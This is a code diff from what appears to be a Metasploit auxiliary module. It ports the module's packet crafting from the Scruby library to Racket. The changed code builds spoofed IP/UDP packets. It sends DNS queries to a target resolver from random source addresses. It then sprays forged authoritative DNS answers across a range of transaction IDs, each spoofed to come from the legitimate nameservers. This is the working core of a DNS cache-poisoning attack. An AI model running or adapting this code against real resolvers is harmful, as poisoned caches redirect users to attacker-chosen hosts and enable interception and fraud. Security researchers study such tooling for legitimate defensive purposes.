@@ -1,6 +1,6 @@
 require 'msf/core'
 require 'net/dns'
-require 'scruby'
+require 'racket'
 require 'resolv'
 
 
@@ -302,16 +302,20 @@ class Metasploit3 < Msf::Auxiliary
 				src_ip = Rex::Text.rand_text(4).unpack("C4").join(".")
 			end
 			
-			buff = (
-				Scruby::IP.new(
-					:src   => src_ip,
-					:dst   => target,
-					:proto => 17
-				)/Scruby::UDP.new(
-					:sport => (rand((2**16)-1024)+1024).to_i,
-					:dport => 53
-				)/req.encode
-			).to_net
+			n = Racket.new
+			n.l3 = Racket::IPv4.new
+			n.l3.src_ip = src_ip
+			n.l3.dst_ip = target
+			n.l3.protocol = 17
+			n.l3.id = rand(0x10000)
+			n.l3.ttl = 255
+			n.l4 = Racket::UDP.new
+			n.l4.src_port = (rand((2**16)-1024)+1024).to_i
+			n.l4.dst_port = 53
+			n.l4.payload  = req.encode
+			n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
+			buff = n.pack			
+
 			ip_sock.sendto(buff, target)
 			queries += 1
 			
@@ -322,20 +326,18 @@ class Metasploit3 < Msf::Auxiliary
 			req.qr = 1
 			req.aa = 1
 
+			# Reuse our Racket object
+			n.l4.src_port = 53
+			n.l4.dst_port = sport.to_i
+			n.l4.payload  = req.encode
+						
 			xidbase.upto(xidbase+numxids-1) do |id|
 				req.id = id
-				barbs.each do |barb|
-					buff = (
-						Scruby::IP.new(
-							#:src   => barbs[i][:addr].to_s,
-							:src   => barb[:addr].to_s,
-							:dst   => target,
-							:proto => 17
-						)/Scruby::UDP.new(
-							:sport => 53,
-							:dport => sport.to_i
-						)/req.encode
-					).to_net
+				barbs.each do |barb|	
+					n.l3.src_ip = barb[:addr].to_s
+					n.l4.fix!(n.l3.src_ip, n.l3.dst_ip)	
+					buff = n.pack
+						
 					ip_sock.sendto(buff, target)
 					responses += 1
 				end
